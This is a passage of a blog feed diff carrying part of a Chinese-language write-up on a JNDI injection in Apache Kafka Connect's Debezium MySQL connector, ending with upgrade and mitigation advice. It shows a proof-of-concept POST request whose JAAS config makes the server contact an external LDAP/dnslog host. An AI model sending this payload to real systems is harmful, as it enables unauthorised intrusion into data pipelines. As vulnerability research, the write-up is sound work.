class=&#34;line&#34;&gt;  &amp;quot;name&amp;quot;: &amp;quot;mysql-connectors1&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;connector&amp;quot;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;state&amp;quot;: &amp;quot;RUNNING&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;worker_id&amp;quot;: &amp;quot;localhost:8083&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;tasks&amp;quot;: [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;quot;id&amp;quot;: 0,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;quot;state&amp;quot;: &amp;quot;RUNNING&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;quot;worker_id&amp;quot;: &amp;quot;localhost:8083&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;type&amp;quot;: &amp;quot;source&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2&gt;&lt;span id=&#34;漏洞检测&#34;&gt; 漏洞检测&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;POC 如下：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /connectors HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: localhost:8083&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 880&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;name&amp;quot;: &amp;quot;mysql-connect&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;config&amp;quot;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;connector.class&amp;quot;: &amp;quot;io.debezium.connector.mysql.MySqlConnector&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.hostname&amp;quot;: &amp;quot;localhost&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.port&amp;quot;: &amp;quot;3306&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.user&amp;quot;: &amp;quot;root&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.password&amp;quot;: &amp;quot;123456&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.server.id&amp;quot;: &amp;quot;316545017&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.server.name&amp;quot;: &amp;quot;tests&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.history.kafka.bootstrap.servers&amp;quot;: &amp;quot;192.168.2.135:9092&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.history.kafka.topic&amp;quot;: &amp;quot;quickstart-events&amp;quot;,    &amp;quot;database.history.producer.security.protocol&amp;quot;: &amp;quot;SASL_SSL&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.history.producer.sasl.mechanism&amp;quot;: &amp;quot;PLAIN&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.history.producer.sasl.jaas.config&amp;quot;: &amp;quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\&amp;quot;ldap://d04f5e9e.dnslog.store.\&amp;quot; useFirstPass=\&amp;quot;true\&amp;quot; serviceName=\&amp;quot;x\&amp;quot; debug=\&amp;quot;true\&amp;quot; group.provider.url=\&amp;quot;xxx\&amp;quot;;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/458.png?raw=true&#34; alt&gt;&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/459.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;span id=&#34;漏洞利用&#34;&gt; 漏洞利用&lt;/span&gt;&lt;/h2&gt;
+&lt;h2&gt;&lt;span id=&#34;修复建议&#34;&gt; 修复建议&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;目前官方已有可更新版本，建议受影响用户升级至：Apache Kafka 3.4.0 及以上版本。&lt;/p&gt;
+&lt;p&gt;暂时无法升级的用户可通过验证 Kafka Connect 连接器配置，仅允许受信任的 JNDI 配置来缓解此漏洞。&lt;/p&gt;
+&lt;h2&gt;&lt;span id=&#34;感谢&#34;&gt; 感谢&lt;/span&gt;&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/616398569&#34;&gt;https://zhuanlan.zhihu.com/p/616398569&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://my.oschina.net/u/4923278/blog/5007756&#34;&gt;https://my.oschina.net/u/4923278/blog/5007756&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/smellycat000/article/details/128962935&#34;&gt;https://blog.csdn.net/smellycat000/article/details/128962935&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_43944305/article/details/108620849&#34;&gt;https://blog.csdn.net/weixin_43944305/article/details/108620849&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://loujitao.github.io/Debezium%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/&#34;&gt;https://loujitao.github.io/Debezium 安装部署 /&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
 </content>
-        <updated>2023-12-04T03:12:30.000Z</updated>
+        <updated>2023-12-05T03:12:30.000Z</updated>
     </entry>
     <entry>
         <id>https://my011215.github.io/2023/10/29/Penetration%20testing/log4j2%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90+%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/</id>
